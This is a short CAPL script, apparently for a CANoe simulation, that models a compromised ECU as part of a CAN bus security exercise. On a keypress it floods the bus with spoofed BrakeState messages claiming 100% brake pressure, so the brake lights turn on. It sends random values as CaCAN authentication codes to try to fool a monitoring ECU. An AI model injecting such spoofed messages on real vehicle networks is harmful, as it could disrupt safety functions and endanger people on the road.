/*@!Encoding:1252*/
/**
 * This ECU is a simulated, compromised ECU.
 * It's goal is to trigger undesired behaviour in other ECUs connected to the same CAN bus.
 * This particular ECU sends out messages pretending to report an applied brake pressure of 100%.
 * The goal of that is to turn on the brake lights without pressing the physical brakes.
**/

variables
{
  message BrakeState msg_BrakeState;
  mstimer t;
  int tdelay=5;
}

on start
{
   write("HACKER: Hello World, I am a compromised ECU.");
}

/**
 * Pressing the 'h' key starts the timer to send out malicious messages.
**/
on key 'h'
{
  write("HACKER: Sending manipulated CAN messages.");
  settimer(t,tdelay);
}

/**
 * Pressing the 'c' key stops the timer to send out malicious messages.
**/
on key 'c'
{
  write("HACKER: Stopped manipulated CAN messages.");
  cancelTimer(t);
  msg_BrakeState.BrakePressure = 0;
  output(msg_BrakeState);
}

/**
 * This function sends out a message to the CAN bus pretending to have a physical brake pressure of 100%.
 * It also sends out 8 random bits as a CaCAN authentication code, in order to fool the monitor ECU.
**/
on timer t{
  msg_BrakeState.BrakePressure = 100;
  msg_BrakeState.CaCAN_Auth = random(256);
  output(msg_BrakeState);
  settimer(t,tdelay);
}